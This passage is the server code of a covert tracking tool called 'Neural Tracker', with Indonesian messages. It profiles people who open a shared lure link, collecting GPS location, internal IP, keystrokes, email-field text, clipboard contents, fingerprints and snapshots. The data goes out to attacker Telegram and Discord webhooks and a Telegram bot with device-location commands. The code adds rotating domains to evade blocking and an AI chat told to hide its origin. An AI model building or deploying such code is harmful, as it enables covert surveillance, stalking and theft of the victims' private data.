    { vendor: 'Microsoft', model: 'Surface Pro 9', screen: '2880x1920', dpr: 2, brand: 'Surface' },
    { vendor: 'Microsoft', model: 'Surface Laptop 5', screen: '2256x1504', dpr: 1.5, brand: 'Surface' },
    { vendor: 'Microsoft', model: 'Surface Book 3', screen: '3000x2000', dpr: 2, brand: 'Surface' },
];

function identifyDevice(detection) {
    if (!detection || !detection.screen) return 'Unknown device';
    const w = detection.screen.width;
    const h = detection.screen.height;
    const dpr = detection.screen.pixelRatio || 1;
    const res = `${Math.min(w,h)}x${Math.max(w,h)}`;
    const uaModel = detection.uaModel || '';
    const uaBrands = detection.uaBrands || [];
    const uaMobile = detection.uaMobile;
    const platform = detection.platform || '';
    const touchPoints = detection.touchPoints || 0;
    const mem = detection.deviceMemory || 0;

    // Exact match from UA hints (most accurate)
    if (uaModel && uaModel !== '') {
        if (uaBrands.some(b => b.includes('iPhone'))) return `Apple ${uaModel}`;
        if (uaBrands.some(b => b.includes('Samsung'))) return `Samsung ${uaModel}`;
        if (uaBrands.some(b => b.includes('Pixel'))) return `Google ${uaModel}`;
        if (uaModel.toLowerCase().includes('x86') || uaModel.toLowerCase().includes('pc')) {
            if (platform.toLowerCase().includes('win')) return `Windows PC (${uaModel})`;
            if (platform.toLowerCase().includes('mac')) return `Mac ${uaModel}`;
            if (platform.toLowerCase().includes('linux')) return `Linux PC (${uaModel})`;
        }
        // Use UA model directly for non-matched brands
        if (uaModel.length > 2) return uaModel;
    }

    // Match by screen + DPR against known devices
    for (const dev of knownDevices) {
        if (dev.screen === res) {
            // DPR should be close (±0.5)
            if (Math.abs(dev.dpr - dpr) <= 0.5) {
                // Check if mobile matches
                if (dev.brand !== 'Desktop' && uaMobile === false) continue;
                if (dev.brand === 'Desktop' && uaMobile === true) continue;
                return dev.model;
            }
        }
    }

    // Fallback by platform
    const isMobile = uaMobile || platform.toLowerCase().includes('android') || platform.toLowerCase().includes('iphone') || platform.toLowerCase().includes('ipad') || (touchPoints > 0 && w < 1024);
    if (isMobile) {
        if (platform.toLowerCase().includes('android')) {
            const cpuCores = parseInt(detection.hardwareConcurrency) || 0;
            const ram = parseFloat(mem) || 0;
            if (cpuCores >= 8 && ram >= 8) return 'High-end Android';
            if (cpuCores >= 6 && ram >= 4) return 'Mid-range Android';
            return 'Entry-level Android';
        }
        if (platform.toLowerCase().includes('iphone') || uaBrands.some(b => b.includes('iPhone'))) return 'Apple iPhone';
        if (platform.toLowerCase().includes('ipad')) return 'Apple iPad';
        return 'Mobile device';
    }

    // Desktop fallback
    if (platform.toLowerCase().includes('win')) return `Windows (${res})`;
    if (platform.toLowerCase().includes('mac')) return `Mac (${res})`;
    if (platform.toLowerCase().includes('linux')) return `Linux (${res})`;

    return `Unknown (${res})`;
}

// ===== AI AUTO-PROFILE =====
function generateProfile(d) {
    if (!d) return null;
    const parts = [];

    // Identity
    const ua = d.userAgent || '';
    const isMobile = /Mobile|Android|iPhone|iPad/i.test(ua);
    const os = ua.includes('Windows') ? 'Windows' : ua.includes('Mac') ? 'macOS' : ua.includes('Linux') ? 'Linux' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Unknown';
    const browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown';
    parts.push(`OS: ${os}, Browser: ${browser}, Mobile: ${isMobile}`);
    if (d.deviceModel && d.deviceModel !== 'Unknown') parts.push(`Device: ${d.deviceModel}`);

    // Location
    if (d.location) {
        parts.push(`Location: ${d.location.lat.toFixed(4)}, ${d.location.lng.toFixed(4)} (acc: ${d.location.accuracy ? d.location.accuracy.toFixed(0)+'m' : 'unknown'})`);
    }
    if (d.ipGeo) {
        parts.push(`GeoIP: ${d.ipGeo.city||''}, ${d.ipGeo.regionName||''}, ${d.ipGeo.country||''} (ISP: ${d.ipGeo.isp||''})`);
    }
    if (d.webrtcIP) parts.push(`Internal IP: ${d.webrtcIP}`);
    if (d.ip) parts.push(`Server IP: ${d.ip}`);

    // Hardware
    const wg = d.webgl;
    if (wg) parts.push(`GPU: ${wg.unmaskedRenderer||wg.renderer||'unknown'}, Vendor: ${wg.unmaskedVendor||wg.vendor||'unknown'}`);
    const fp = d.fingerprint;
    if (fp) parts.push(`Screen: ${fp.screen||''}, Platform: ${fp.platform||''}, Timezone: ${fp.timezone||''}, CPU cores: ${fp.cpu||'?'}, Memory: ${fp.mem||'?'}GB`);
    if (d.cpuTiming && d.cpuTiming.length) {
        const avg = d.cpuTiming.reduce((a,b)=>a+b.opsPerMs,0)/d.cpuTiming.length;
        parts.push(`CPU Performance: ${Math.round(avg)} ops/ms`);
    }
    if (d.audioFP) parts.push(`Audio Fingerprint: ${d.audioFP.hash.slice(0,16)}...`);
    if (d.fonts) parts.push(`Fonts: ${d.fonts.count} installed (${d.fonts.installed.slice(0,5).join(',')}...)`);

    // Battery
    if (d.battery && d.battery.level !== undefined) {
        parts.push(`Battery: ${Math.round(d.battery.level*100)}% ${d.battery.charging ? '(charging)' : ''}`);
    }

    // Connection
    if (d.connection && d.connection.type) {
        parts.push(`Connection: ${d.connection.type} ${d.connection.effectiveType||''}`);
    }
    if (d.speedTest) parts.push(`Network latency: ${d.speedTest.ms}ms`);

    // Behavior
    if (d.keystrokes && d.keystrokes.length) {
        const texts = d.keystrokes.map(k=>k.k).join('').slice(0,100);
        parts.push(`Keystroke sample: "${texts}"`);
        const typingSpeed = d.keystrokes.length > 10 ? Math.round(d.keystrokes.length / ((d.keystrokes[d.keystrokes.length-1].ts - d.keystrokes[0].ts) / 1000)) + ' chars/s' : 'N/A';
        parts.push(`Typing speed: ${typingSpeed}`);
    }
    if (d.fieldEmail) parts.push(`Email field: ${d.fieldEmail.slice(0,80)}`);
    if (d.clipboard) parts.push(`Clipboard: ${d.clipboard.slice(0,80)}`);
    if (d.bluetooth) parts.push(`Bluetooth nearby: ${d.bluetooth.name||d.bluetooth.id}`);

    // Motion
    if (d.motion) {
        parts.push(`Device acceleration: ${d.motion.accX?.toFixed(1)||'-'}, ${d.motion.accY?.toFixed(1)||'-'}, ${d.motion.accZ?.toFixed(1)||'-'}`);
    }

    // Time
    parts.push(`First seen: ${new Date(d.firstSeen).toLocaleString()}, Last seen: ${new Date(d.lastSeen).toLocaleString()}`);

    // Risk assessment
    let riskScore = 0;
    const riskFactors = [];
    if (isMobile) { riskScore += 10; riskFactors.push('mobile device'); }
    if (d.location && d.location.accuracy > 1000) { riskScore += 5; riskFactors.push('low accuracy GPS'); }
    if (d.battery && d.battery.level < 0.15) { riskScore += 10; riskFactors.push('low battery (<15%)'); }
    if (d.connection && d.connection.type === 'cellular') { riskScore += 5; riskFactors.push('cellular connection'); }
    if (d.idle && d.idle.state === 'idle') { riskScore += 8; riskFactors.push('user idle during tracking'); }
    if (d.visibility && d.visibility.state === 'hidden') { riskScore += 5; riskFactors.push('page hidden during interaction'); }
    if (d.tabs && d.tabs > 2) { riskScore += 5; riskFactors.push(`multi-tab (${d.tabs} tabs)`); }
    if (d.cpuTiming && d.cpuTiming.length) {
        const avg = d.cpuTiming.reduce((a,b)=>a+b.opsPerMs,0)/d.cpuTiming.length;
        if (avg > 200) { riskScore += 8; riskFactors.push('high performance CPU (likely desktop)'); }
    }

    const riskLevel = riskScore >= 30 ? 'HIGH' : riskScore >= 15 ? 'MEDIUM' : 'LOW';
    parts.push(`Risk assessment: ${riskLevel} (score: ${riskScore})`);
    if (riskFactors.length) parts.push(`Risk factors: ${riskFactors.join(', ')}`);

    return {
        label: d.label,
        profile: parts.join('\n• '),
        riskLevel,
        riskScore,
        riskFactors,
        deviceType: isMobile ? 'Mobile' : 'Desktop',
        os,
        browser,
        generatedAt: Date.now()
    };
}

app.get('/api/profile/:deviceId', (req, res) => {
    const d = devices.get(req.params.deviceId);
    if (!d) return res.status(404).json({ error: 'not found' });
    res.json(generateProfile(d));
});

app.get('/api/profile', (req, res) => {
    const result = {};
    for (const [id, d] of devices) {
        result[id] = generateProfile(d);
    }
    res.json(result);
});

// ===== WEBHOOK (Telegram / Discord) =====
const webhooks = { telegram: [], discord: [] };

app.post('/api/webhook', (req, res) => {
    const { type, url } = req.body;
    if (!type || !url) return res.status(400).json({ error: 'type and url required' });
    if (!['telegram', 'discord'].includes(type)) return res.status(400).json({ error: 'type must be telegram or discord' });
    if (!webhooks[type].includes(url)) webhooks[type].push(url);
    saveDevices();
    res.json({ ok: true, webhooks });
});

app.get('/api/webhook', (req, res) => {
    res.json(webhooks);
});

app.delete('/api/webhook', (req, res) => {
    const { type, url } = req.body;
    if (!type || !url) return res.status(400).json({ error: 'type and url required' });
    webhooks[type] = webhooks[type].filter(u => u !== url);
    saveDevices();
    res.json({ ok: true, webhooks });
});

app.post('/api/webhook/test', (req, res) => {
    const { type, url } = req.body;
    if (!type || !url) return res.status(400).json({ error: 'type and url required' });
    const testText = `[Neural Tracker Test]\nJika Anda menerima pesan ini, webhook berfungsi dengan baik.\nWaktu: ${new Date().toLocaleString('id-ID')}`;
    
    if (type === 'telegram') {
        fetch(url.replace('{text}', encodeURIComponent(testText)), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ text: testText }) })
            .then(r => res.json({ ok: r.ok, status: r.status }))
            .catch(e => res.status(500).json({ error: e.message }));
    } else if (type === 'discord') {
        fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: testText }) })
            .then(r => res.json({ ok: r.ok, status: r.status }))
            .catch(e => res.status(500).json({ error: e.message }));
    } else {
        res.status(400).json({ error: 'invalid type' });
    }
});

async function sendWebhook(deviceId, eventType, data) {
    const d = devices.get(deviceId);
    if (!d) return;
    const profile = generateProfile(d);
    const timeStr = new Date().toLocaleString('id-ID');
    
    let extraInfo = '';
    if (eventType === 'new_device') {
        extraInfo = `IP: ${d.ip || 'N/A'}\nBrowser: ${profile.browser}\nOS: ${profile.os}\nDevice: ${profile.deviceType}`;
    } else if (eventType === 'location_update' && data && data.location) {
        extraInfo = `Lat: ${data.location.lat.toFixed(4)}\nLng: ${data.location.lng.toFixed(4)}\nAkurasi: ${data.location.accuracy ? data.location.accuracy.toFixed(0) + 'm' : 'N/A'}`;
    } else if (eventType === 'forensics_alert') {
        extraInfo = `Tipe: ${data.type}\nDetail: ${data.detail}`;
    } else if (eventType === 'keystroke') {
        extraInfo = `Keystroke baru: "${(data.k || '').slice(0,20)}"`;
    } else if (eventType === 'snapshot_taken') {
        extraInfo = `Snapshot baru tersedia`;
    }
    
    const text = `[Neural Tracker]\nDevice: ${d.label}\nID: ${deviceId.slice(0,8)}\nEvent: ${eventType}\nWaktu: ${timeStr}\n${extraInfo}\nLocation: ${d.location ? d.location.lat.toFixed(4)+','+d.location.lng.toFixed(4) : 'N/A'}\nRisk: ${profile.riskLevel}`;
    const shortText = `[Neural] ${d.label}: ${eventType}`;

    for (const url of webhooks.telegram) {
        try {
            await fetch(url.replace('{text}', encodeURIComponent(text)), { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' }, 
                body: JSON.stringify({ text, parse_mode: 'HTML' }) 
            });
        } catch(e) {}
    }
    for (const url of webhooks.discord) {
        try {
            await fetch(url, { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' }, 
                body: JSON.stringify({ content: text }) 
            });
        } catch(e) {}
    }
}

// Patch socket events to trigger webhooks
const origEmit = io.emit.bind(io);
io.emit = function(event, data) {
    if (event === 'device-new' && data && data.id) {
        sendWebhook(data.id, 'new_device', data).catch(()=>{});
    }
    if (event === 'device-update' && data && data.location) {
        sendWebhook(data.id, 'location_update', data).catch(()=>{});
    }
    if (event === 'forensics-alert' && data && data.deviceId) {
        sendWebhook(data.deviceId, 'forensics_alert', data).catch(()=>{});
    }
    if (event === 'new-snapshot' && data && data.deviceId) {
        sendWebhook(data.deviceId, 'snapshot_taken', data).catch(()=>{});
    }
    if (event === 'device-offline' && data) {
        sendWebhook(data, 'device_offline', {}).catch(()=>{});
    }
    return origEmit(event, data);
};

// ===== AI CHAT (Mimo) =====
const MIMO_API_KEY = process.env.MIMO_API_KEY || '';
const MIMO_API_URL = 'https://api.xiaomimimo.com/v1/chat/completions';
const aiChatHistory = new Map(); // deviceId -> [{ role, content }]

// Store chat message in device record
function addChatMessage(deviceId, role, content) {
    if (!aiChatHistory.has(deviceId)) aiChatHistory.set(deviceId, []);
    const history = aiChatHistory.get(deviceId);
    history.push({ role, content, time: Date.now() });
    if (history.length > 100) aiChatHistory.set(deviceId, history.slice(-100));
    // Also store on device object for admin access
    const d = devices.get(deviceId);
    if (d) {
        if (!d.aiChat) d.aiChat = [];
        d.aiChat.push({ role, content, time: Date.now() });
        if (d.aiChat.length > 100) d.aiChat = d.aiChat.slice(-100);
        saveDevices();
    }
}

async function callMimoAPI(messages) {
    if (!MIMO_API_KEY) {
        return 'Maaf, AI belum dikonfigurasi oleh admin.';
    }
    try {
        const resp = await fetch(MIMO_API_URL, {
            method: 'POST',
            headers: {
                'api-key': MIMO_API_KEY,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                model: 'mimo-v2.5-pro',
                messages: [
                    {
                        role: 'system',
                        content: 'Kamu adalah asisten AI bernama Neural AI. Kamu membantu pengguna dengan pertanyaan apapun. Jawab dengan sopan, informatif, dan dalam bahasa Indonesia. Jangan sebutkan bahwa kamu adalah AI yang dibuat oleh Xiaomi. Cukup sebutkan kamu adalah Neural AI Assistant.'
                    },
                    ...messages
                ],
                max_completion_tokens: 1024,
                temperature: 0.7,
                stream: false
            })
        });
        const data = await resp.json();
        if (data.choices && data.choices[0] && data.choices[0].message) {
            return data.choices[0].message.content;
        }
        return 'Maaf, terjadi kesalahan saat memproses pesan Anda.';
    } catch (e) {
        console.error('Mimo API error:', e.message);
        return 'Maaf, koneksi ke AI sedang bermasalah. Silakan coba lagi.';
    }
}

// REST endpoint for AI chat
app.post('/api/ai-chat', async (req, res) => {
    const { deviceId: did, message } = req.body;
    if (!did || !message) return res.status(400).json({ error: 'deviceId and message required' });

    addChatMessage(did, 'user', message);

    // Build conversation history for context (last 20 messages)
    const history = aiChatHistory.get(did) || [];
    const apiMessages = history.slice(-20).map(m => ({ role: m.role, content: m.content }));

    const aiReply = await callMimoAPI(apiMessages);
    addChatMessage(did, 'assistant', aiReply);

    // Emit to admin panel
    io.emit('ai-chat-update', { deviceId: did, message, reply: aiReply, time: Date.now() });

    res.json({ reply: aiReply });
});

// Get chat history for a device (admin only)
app.get('/api/ai-chat/:deviceId', (req, res) => {
    const d = devices.get(req.params.deviceId);
    if (!d) return res.json([]);
    res.json(d.aiChat || []);
});

// Get all devices with chat history (admin only)
app.get('/api/ai-chat', (req, res) => {
    const result = {};
    for (const [id, d] of devices) {
        if (d.aiChat && d.aiChat.length) {
            result[id] = { label: d.label, messages: d.aiChat.slice(-50) };
        }
    }
    res.json(result);
});

// ===== ANTI-FORENSICS ALERTS =====
app.post('/api/alert-forensics', (req, res) => {
    const { deviceId, type, detail } = req.body;
    const d = devices.get(deviceId);
    if (!d) return res.status(404).json({ error: 'not found' });
    if (!d.alerts) d.alerts = [];
    d.alerts.push({ type, detail, time: Date.now() });
    if (d.alerts.length > 50) d.alerts = d.alerts.slice(-50);
    saveDevices();
    io.emit('forensics-alert', { deviceId, label: d.label, type, detail, time: Date.now() });
    res.json({ ok: true });
});

app.get('/api/alerts/:deviceId', (req, res) => {
    const d = devices.get(req.params.deviceId);
    if (!d) return res.json([]);
    res.json(d.alerts || []);
});

// ===== AUTO-TARGETING =====
app.get('/api/target/link', (req, res) => {
    const baseUrl = `${req.protocol}://${req.get('host')}`;
    const expiresAt = linkExpiry.enabled && linkExpiry.duration > 0 ? Date.now() + linkExpiry.duration * 60 * 1000 : null;
    res.json({
        trackingLink: baseUrl + '/',
        adminLink: baseUrl + '/admin.html',
        whatsapp: 'https://wa.me/?text=' + encodeURIComponent('Lihat ini: ' + baseUrl + '/'),
        telegram: 'https://t.me/share/url?url=' + encodeURIComponent(baseUrl + '/') + '&text=' + encodeURIComponent('Cek link ini'),
        email: `mailto:?subject=Penting&body=` + encodeURIComponent(baseUrl + '/'),
        expiresAt,
        expiryEnabled: linkExpiry.enabled,
        expiryMinutes: linkExpiry.duration
    });
});

app.post('/api/admin/expiry', (req, res) => {
    const { enabled, duration } = req.body;
    linkExpiry.enabled = !!enabled;
    linkExpiry.duration = parseInt(duration) || 0;
    res.json({ ok: true, expiry: linkExpiry });
});

app.get('/api/admin/expiry', (req, res) => {
    res.json(linkExpiry);
});

// ===== TEMPLATE MANAGEMENT =====
app.post('/api/admin/template', (req, res) => {
    const { template } = req.body;
    if (templates.includes(template)) {
        currentTemplate = template;
        res.json({ ok: true, template: currentTemplate });
    } else {
        res.status(400).json({ error: 'invalid template', available: templates });
    }
});

app.get('/api/admin/template', (req, res) => {
    res.json({ template: currentTemplate, available: templates });
});

// ===== CAPTCHA =====
app.post('/api/captcha/verify', (req, res) => {
    const { deviceId, answer } = req.body;
    // Simple math captcha verification or just log it
    if (deviceId) {
        captchaData.set(deviceId, { answer: answer || '', time: Date.now() });
        if (captchaData.size > 1000) {
            const firstKey = captchaData.keys().next().value;
            if (firstKey) captchaData.delete(firstKey);
        }
    }
    res.json({ ok: true });
});

app.get('/api/captcha/data', (req, res) => {
    const data = {};
    for (const [id, d] of captchaData) {
        data[id] = d;
    }
    res.json(data);
});

// ===== TELEGRAM BOT CONTROL =====
const tgBotTokens = []; // stored bot tokens for polling

app.post('/api/admin/telegram-bot', (req, res) => {
    const { token } = req.body;
    if (!token) return res.status(400).json({ error: 'token required' });
    if (!tgBotTokens.includes(token)) tgBotTokens.push(token);
    res.json({ ok: true, bots: tgBotTokens.length });
});

app.get('/api/admin/telegram-bot', (req, res) => {
    res.json({ bots: tgBotTokens.length });
});

app.delete('/api/admin/telegram-bot', (req, res) => {
    tgBotTokens.length = 0;
    telegramBots.clear();
    res.json({ ok: true, bots: 0 });
});

// Telegram bot polling handler
async function pollTelegramBots() {
    for (const botToken of tgBotTokens) {
        try {
            const url = `https://api.telegram.org/bot${botToken}/getUpdates?timeout=30&offset=0`;
            const resp = await fetch(url).then(r => r.json());
            if (resp.ok && resp.result) {
                for (const update of resp.result) {
                    if (update.message && update.message.text) {
                        const chatId = update.message.chat.id;
                        const text = update.message.text.trim();
                        const args = text.split(' ');
                        const cmd = args[0].toLowerCase();
                        
                        let reply = '';
                        if (cmd === '/start') {
                            telegramBots.set(chatId, { token: botToken, allowed: true });
                            reply = 'Bot terhubung! Gunakan /devices untuk lihat daftar device.';
                        } else if (cmd === '/devices') {
                            const list = [];
                            for (const [id, d] of devices) {
                                const online = !!d.socketId && io.sockets.sockets.has(d.socketId);
                                list.push(`${d.label} ${online ? '🟢' : '🔴'} — ${d.location ? d.location.lat.toFixed(2)+','+d.location.lng.toFixed(2) : 'N/A'}`);
                            }
                            reply = list.length ? 'Devices:\n' + list.join('\n') : 'Tidak ada device.';
                        } else if (cmd === '/online') {
                            const count = [...devices.values()].filter(d => !!d.socketId && io.sockets.sockets.has(d.socketId)).length;
                            reply = `Device online: ${count}/${devices.size}`;
                        } else if (cmd === '/locate') {
                            const id = args[1];
                            if (id && devices.has(id)) {
                                const d = devices.get(id);
                                reply = `${d.label}\nLat: ${d.location ? d.location.lat : 'N/A'}\nLng: ${d.location ? d.location.lng : 'N/A'}\nIP: ${d.ip || 'N/A'}\nTerakhir: ${new Date(d.lastSeen).toLocaleString()}`;
                            } else {
                                reply = 'Device tidak ditemukan. Gunakan /devices untuk lihat ID.';
                            }
                        } else if (cmd === '/help') {
                            reply = '/devices — lihat semua device\n/online — jumlah online\n/locate [id] — lokasi device\n/snapshot [id] — ambil snapshot';
                        } else {
                            reply = 'Perintah tidak dikenal. Ketik /help';
                        }
                        
                        if (reply) {
                            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ chat_id: chatId, text: reply })
                            }).catch(() => {});
                        }
                    }
                }
            }
        } catch(e) {}
    }
}

// Poll every 5 seconds
setInterval(pollTelegramBots, 5000);

// ===== AUTO-ROTATE DOMAIN =====
app.post('/api/admin/domains', (req, res) => {
    const { list } = req.body;
    if (Array.isArray(list)) {
        domains.length = 0;
        domains.push(''); // current domain always first
        for (const d of list) {
            if (d && !domains.includes(d)) domains.push(d);
        }
    }
    res.json({ ok: true, domains: domains.slice(1) });
});

app.get('/api/admin/domains', (req, res) => {
    res.json({ domains: domains.slice(1), currentIndex: currentDomainIndex });
});

app.post('/api/admin/domains/rotate', (req, res) => {
    currentDomainIndex = (currentDomainIndex + 1) % domains.length;
    res.json({ ok: true, domain: domains[currentDomainIndex] || 'current' });
});

// Get active domain for tracking link
app.get('/api/active-domain', (req, res) => {
    const domain = domains[currentDomainIndex];
    res.json({ domain: domain || req.get('host'), index: currentDomainIndex });
});

// Admin login/logout
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 5,
    message: { error: 'too many login attempts, try again in 15 minutes' },
    standardHeaders: true,
    legacyHeaders: false
});

app.post('/api/admin/login', loginLimiter, (req, res) => {
    const { password } = req.body || {};
    if (password === ADMIN_PASSWORD) {
        const token = crypto.randomBytes(24).toString('hex');
        adminTokens.add(token);
        saveTokens();
        res.json({ ok: true, token });
    } else {
        res.status(401).json({ error: 'wrong password' });
    }
});

app.post('/api/admin/logout', (req, res) => {
    const token = req.headers['x-admin-token'] || (req.headers['authorization'] && req.headers['authorization'].replace('Bearer ', ''));
    if (token) { adminTokens.delete(token); saveTokens(); }
    res.json({ ok: true });
});

app.use('/snapshots', express.static(path.join(DATA_DIR, 'snapshots')));
app.use('/voice', express.static(path.join(DATA_DIR, 'voice')));

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
    console.log(`Admin panel: http://localhost:${PORT}/admin.html`);
});
